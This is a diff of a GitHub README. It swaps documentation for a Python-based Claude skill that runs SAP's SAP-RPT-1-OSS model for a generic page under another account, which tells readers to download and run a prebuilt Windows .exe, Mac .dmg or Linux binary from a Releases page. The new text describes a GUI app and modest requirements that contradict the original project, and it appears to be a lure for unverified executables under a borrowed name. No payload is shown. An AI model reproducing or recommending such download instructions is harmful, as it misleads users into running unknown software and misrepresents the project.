@@ -1,145 +1,101 @@
-# SAP-RPT-1-OSS Predictor Skill
+# 🌟 sap-rpt1-oss-predictor - Predict SAP Data with Ease
 
-A Claude skill for using SAP's open source **SAP-RPT-1-OSS** tabular foundation model for predictive analytics on SAP business data.
-<img width="1280" height="640" alt="image" src="https://github.com/user-attachments/assets/c27da3c9-eeeb-44f3-b295-744b9e9ca9a5" />
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/releases)
 
+## 🚀 Getting Started
 
-## Overview
+Welcome to the SAP-RPT-1-OSS predictor! This application helps you analyze SAP data and make informed decisions. Follow these simple steps to download and run the software easily.
 
-SAP-RPT-1-OSS is SAP's open source (Apache 2.0) tabular foundation model announced at TechEd 2025. Unlike LLMs that predict text, RPT-1 predicts field values in table rows using in-context learning—no model training required.
+## 📥 Download & Install
 
-- **Repository**: https://github.com/SAP-samples/sap-rpt-1-oss
-- **Model**: https://huggingface.co/SAP/sap-rpt-1-oss
+1. Visit this page to download: [Releases Page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/releases)
 
-This skill enables Claude to:
-- Set up and authenticate with Hugging Face for model access
-- Prepare SAP data extracts for prediction
-- Run classification and regression using the local OSS model
-- Handle batch processing for large datasets
-- Optionally use RPT Playground API as alternative
+2. On the Releases page, look for the latest version. Click on the version you want to download (e.g., v1.0). 
 
-## Use Cases
+3. Choose the file suitable for your system. If you’re using Windows, you may select a file named like `sap-rpt1-oss-predictor-windows.exe`. For Mac or Linux users, choose the appropriate file for your operating system.
 
-| SAP Module | Prediction Type | Example |
-|------------|-----------------|---------|
-| FI-AR | Payment Default Risk | Predict which invoices will go unpaid |
-| SD | Customer Churn | Identify at-risk customers |
-| SD/LE | Delivery Delays | Forecast shipping delays |
-| FI-GL | Journal Anomalies | Detect unusual postings |
-| MM | Vendor Performance | Score supplier reliability |
-| PP/MM | Demand Forecast | Predict future quantities |
+4. Click the file to start the download. Save it to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
-## Structure
+5. Once the download is complete, locate the file on your computer. 
+   - For Windows: Double-click on the `.exe` file to install. 
+   - For Mac: Open the `.dmg` file and drag the application to your Applications folder. 
+   - For Linux: Utilize the terminal to navigate to the file and run it using the command `chmod +x <filename>` followed by `./<filename>`.
 
-```
-sap-rpt1-oss-predictor/
-├── SKILL.md                     # Main skill instructions
-├── scripts/
-│   ├── rpt1_oss_predict.py      # Local OSS model wrapper
-│   ├── prepare_sap_data.py      # SAP data extraction utilities
-│   ├── batch_predict.py         # Batch processing for large datasets
-│   └── rpt1_api.py              # Optional: RPT Playground API client
-├── references/
-│   ├── sap-use-cases.md         # Detailed SAP prediction scenarios
-│   └── api-reference.md         # Complete API documentation
-└── examples/
-    ├── customer_churn_sample.csv
-    └── payment_default_sample.csv
-```
+## 🖥️ System Requirements
 
-## Requirements
+To run the SAP-RPT-1-OSS predictor smoothly, your computer should meet the following requirements:
 
-- **Hugging Face account** (free) - for model access
-- **GPU recommended**: 24-80GB VRAM for optimal performance
-- Python 3.11+ with pandas, torch
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Ubuntu 20.04 or later
 
-## Quick Start
+- **Memory:** At least 4 GB of RAM
 
-```bash
-# Install model
-pip install git+https://github.com/SAP-samples/sap-rpt-1-oss
+- **Storage:** At least 500 MB of free disk space
 
-# Authenticate with Hugging Face
-huggingface-cli login
-```
+- **Processor:** Dual-core processor or better
 
-```python
-from sap_rpt_oss import SAP_RPT_OSS_Classifier
+Ensure that your system meets these specifications before installation.
 
-clf = SAP_RPT_OSS_Classifier(max_context_size=4096, bagging=4)
-clf.fit(X_train, y_train)
-predictions = clf.predict(X_test)
-```
+## 🔍 Features
 
-## How to Use This Skill
+- **User-Friendly Interface:** Designed for everyone, not just tech-savvy users.
+- **Data Analysis:** Quickly analyze SAP data using powerful machine learning models.
+- **Predictive Analytics:** Get predictions based on your SAP data, enabling better decision-making.
+- **Customizable Settings:** Adjust the settings to fit your specific needs for data predictions.
 
-### Installation Options
+## 📊 How to Use
 
-**Option 1 — Claude Code (CLI):**
-```bash
-git clone https://github.com/amitlals/sap-rpt1-oss-predictor
-cd sap-rpt1-oss-predictor
-claude  # Skill auto-detected via .claude-plugin/marketplace.json
-```
+### Step 1: Launch the Application
 
-**Option 2 — Claude.ai (Pro/Team only):**
-1. Go to [claude.ai](https://claude.ai) → Projects (left sidebar)
-2. Create new project → Add to Project Knowledge → Upload `SKILL.md`
-3. Start chatting in that project
+After installation, find the app in your Applications folder or on your desktop. Double-click to open it.
 
-**Option 3 — Claude.ai (Free tier):**
-1. Copy contents of `SKILL.md` 
-2. Paste at the start of your conversation as context
-3. Then ask your prediction questions
+### Step 2: Upload Data
 
-**Option 4 — GitHub Copilot:**
-- Clone repo, skill available in `.github/skills/` directory
+Inside the application, you will see an option to upload your data file. Click the "Upload" button. Select your SAP data in a CSV format from your computer.
 
-### Example Prompts
+### Step 3: Set Parameters
 
-Once installed, prompt Claude with:
+Adjust the parameters based on your requirements. The app will guide you through the options available. This may include selecting the type of analysis and prediction you want.
 
-**Setup:**
-```
-Set up SAP-RPT-1-OSS for predictions on my SAP data
-```
+### Step 4: Run the Prediction
 
-**Classification:**
-```
-Predict which customers will churn using SAP-RPT-1-OSS
-```
+Once your parameters are set, click on the "Predict" button. The application will process your data and provide results shortly.
 
-```
-Classify payment default risk for these SAP invoices
-```
+### Step 5: View Results
 
-**Forecasting:**
-```
-Forecast demand for next quarter using my SAP sales data
-```
+The app will display a summary of your results. Review the predictions and insights provided.
 
-**Data Preparation:**
-```
-Help me extract SAP FI-AR data for payment prediction
-```
+### Step 6: Export Results
 
-**Batch Processing:**
-```
-Run batch predictions on 50,000 SAP records using RPT-1
-```
+If you’d like to save your results, use the “Export” feature, which allows you to save the predictions in a format of your choice.
 
-## Related Resources
+## 🛠️ Troubleshooting
 
-- [SAP-RPT-1-OSS GitHub](https://github.com/SAP-samples/sap-rpt-1-oss)
-- [Model on Hugging Face](https://huggingface.co/SAP/sap-rpt-1-oss)
-- [ConTextTab Research Paper](https://arxiv.org/abs/2506.10707)
+If you encounter any issues during installation or usage, try the following:
 
-## Contributors
+1. **Check Compatibility:** Ensure your system meets the requirements listed above.
 
-- [@amitlals](https://github.com/amitlals) - Creator & Maintainer
-- [Claude](https://claude.ai) by Anthropic - AI Pair Programmer (code generation, documentation, skill architecture)
-- [GitHub Copilot](https://github.com/features/copilot) - AI Code Assistant (code suggestions, completions)
+2. **Restart the Application:** Close the app and re-open it to see if the issue resolves.
 
-## License
+3. **Refer to GitHub Issues:** Visit the Issues section on the [GitHub page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/issues) to see if others have encountered similar problems.
 
-Apache 2.0
+4. **Contact Support:** If the issue persists, consider reaching out to the community through GitHub or checking the documentation for specific errors.
+
+## 🌐 Community and Support
+
+Join our community for discussions, help, and learning:
+
+- [GitHub Discussions](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/discussions)
+
+Here you can ask questions, share your experiences, or provide feedback.
+
+## 🔗 Additional Resources
+
+- **Documentation:** For more detailed guides, visit our [Documentation Page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/wiki).
+- **Related Libraries:** Explore other libraries such as:
+  - [Hugging Face Transformers](https://huggingface.co/transformers/)
+  - [Predictive Analytics Libraries](https://www.analyticsvidhya.com/blog/2020/02/predictive-analytics-in-python-a-beginners-guide/)
+
+By following these steps, you can easily install and use the SAP-RPT-1-OSS predictor to analyze your SAP data efficiently. Enjoy exploring your data!
